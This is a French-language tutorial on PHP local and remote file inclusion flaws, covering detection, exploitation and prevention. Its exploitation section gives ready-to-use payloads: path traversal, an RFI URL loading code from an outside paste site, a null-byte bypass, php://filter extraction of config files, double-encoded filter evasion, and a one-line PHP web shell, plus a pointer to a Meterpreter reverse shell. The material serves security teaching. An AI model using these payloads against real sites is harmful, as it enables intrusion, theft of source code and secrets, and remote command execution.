# Failles web - include

## Description
La faille include est une faille de moins en moins présente, mais elle reste une classique. Elle permet l'injection de fichier en détournant l'ouverture d'un fichier attendu par le serveur. Cette faille permet d'accéder au code source du site, d'exécuter un de ses scripts, de le défigurer ou encore de faire exécuter un script externe.

Il existe de ux catégories de failles include:
* **Locale** (LFI) : exécution de fichiers présents sur le site
* **Distante** (RFI) : eéxcution de fichiers exterieurs contrôlés par l'attaquant

## Détection
S'il est possible d'analyser le code les fonctions suivantes sont vulnérables:
* PHP : `include`, `include_once`, `require`, `require_once`
* Node : `require`

Les options PHP sont également des indices lorsque l'on y a accès:
* `allow_url_open` : permet la récupération à des ressources distantes (RFI)
* `allow_url_include`: permet l'inclusion de ressources distantes (RFI)
* `open_basedir`: si non définie, la portée d'une faille LFI peut être plus importante sur le SI

Il est également possible de tester l'URL en injectant un path :

    http://domain.com/index.php?page=../../../../../
Si une erreur est détectée c'est que le site est probablement vulnérable à la faille include.

Les fonctions d'accès au système de fichiers peuvent être un problème avec l'utilisationd es filtres en PHP.

## Intention
Via l'exploitation d'une **LFI**, il est possible de:
* extraire des fichiers du serveur, et donc des sources ou des fichiers sensibles
* exécuter des scripts du serveur

Via l'exploitation d'une **RFI**, il est possible de :
* exécuter un script distant, permettant par exemple l'installation d'une backdoor
* défigurer le site

## Exploitation

### LFI
Le fichier inclu est interprété, on peut donc exécuté un script admin comme suit:

    ?inc=../admin
    ?inc=../admin&arg=value


### RFI
Par exemple, considérons un script PHP affichant le fichier `index.php`:

    <?php echo file_get_contents("index.php"); ?>
A défaut de le stocké sur son propre serveur, il est possible d'utiliser un site comme https://pastebin.com pour stocker ce code (`raw.php`). Ne reste plus qu'à passer le fichier par exemple avec comme point d'entrée la configuration du fichier de langue et le # (`%23`) à la fin de l'url pour utiliser le payload:

    http://domain.cim/index.php?lang=http://pastebin.com/raw.php?i=Qbsbgvpk%23


### Null Byte
Le null byte `%00` sert à marquer la fin d'une chaîne de caractère. Il peut être utilsié dans le cas d'une injection de fichier quand par exemple l'extention est ajouté par le code. Pour charger le fichier `admin.php`, la valeur de la variable dans l'URL est `admin` et le script sur le serveur concatène le `.php`.
Dans ce cas le serveur contraint au chargement de fichier PHP. Pour le contourner et par exemple récupérer un `config.ini` il suffit de rentrer `config.ini%00` ainsi lors de l'interpretation le nom s'arrêtera au null byte et le `.php` concaténé ne sera pas lu.

### Filtres et extraction de fichier
L'utilisation de filtres sur une LFI permet d'extraire des fichiers, en base 64 ou compréssés:

    ?inc=php://filter/read=convert.base64-encode/resource=config.php
    ?inc=php://filter/read=zlib.deflate/resource=config.php
    ?inc=php://filter/read=bzip2.compress/resource=config.php

A noter que `php://filter` est un wrapper PHP permettant d'appliquer un filtre sur un flux.

### Contourner le fitrage sur caractère
Le serveur peut se prémunir de cette attaque en bloquant les caractère `.` et `/`. Il faut donc les remplacer par l'encodage:

    : => %3A
    . => %2E
    / => %2F
    = => %3D
    - => %2D
Puis en remplacant `%` par son encodage `%25` on a :

    : => %253A
    . => %252E
    / => %252F
    = => %253D
    - => %252D
Ce qui permet de transformer :

    ?inc=php://filter/read=convert.base64-encode/resource=config.php
en double encoding :

    page=php%253A%252F%252Ffilter%252Fconvert%252ebase64%252dencode%252Fresource%253Dconfig%252Ephp

### Shell
Pour obtenir un shell sur un site vulnérable à la faille include, il suffit de lui passer en RFI un script PHP comprenant le code suivant:

    <?php system($_GET['cmd']); ?>

Pour créer un reverse shell, Meterpreter permet de constuire des scripts configurale avec `php/reverse_tcp`.

## Prévention
Pour se prémunir il faut:
* filtrer et valider les entrées utilisateurs
* Ne jamais exéccuter les entrées utilisateurs

Les fonctions `allow_url_open` et `allow_url_include` désactivées permettent de se protéger contre les RFI.

L'extension `Suhosin` pour PHP permet de bloquer l'utilisationd des wrappers. Les fonctions `file_exists`, `is_file`, et `filesize` renverront false dans le cas de l'utilisation d'un wrapper sur le nom de fichiers.

## Liens
https://blog.clever-age.com/fr/2014/10/21/owasp-local-remote-file-inclusion-lfi-rfi/
https://openclassrooms.com/fr/courses/2091901-protegez-vous-efficacement-contre-les-failles-web/2680172-la-faille-include
https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion
https://www.owasp.org/index.php/Testing_for_Remote_File_Inclusion
